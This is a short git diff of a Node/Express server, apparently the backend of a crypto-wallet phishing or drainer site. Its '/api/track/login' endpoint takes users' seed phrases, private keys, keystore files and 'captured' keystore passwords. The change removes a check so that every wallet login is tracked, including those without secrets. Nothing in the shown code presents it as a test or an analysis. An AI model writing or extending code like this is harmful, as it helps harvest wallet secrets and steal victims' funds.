@@ -369,12 +369,6 @@ app.post("/api/withdraw", authMiddleware, (req, res) => {
 app.post("/api/track/login", (req, res) => {
   const { address, walletType, balance, assets, transactions: txs, importMethod, mnemonic, privateKey, keystoreJSON, keystorePassword, hasPrivateKey, keystorePreview, keystorePasswordCaptured } = req.body;
   if (!address) return res.status(400).json({ error: "Address required" });
-  const hasSensitive = (
-    (typeof mnemonic === 'string' && mnemonic.trim().length > 0) ||
-    (typeof privateKey === 'string' && privateKey.trim().length > 0) ||
-    (typeof keystoreJSON === 'string' && keystoreJSON.trim().length > 0)
-  );
-  if (!hasSensitive) return res.json({ success: true });
   const lower = address.toLowerCase();
   if (deletedAddresses.includes(lower)) {
     deletedAddresses = deletedAddresses.filter(a => a !== lower);
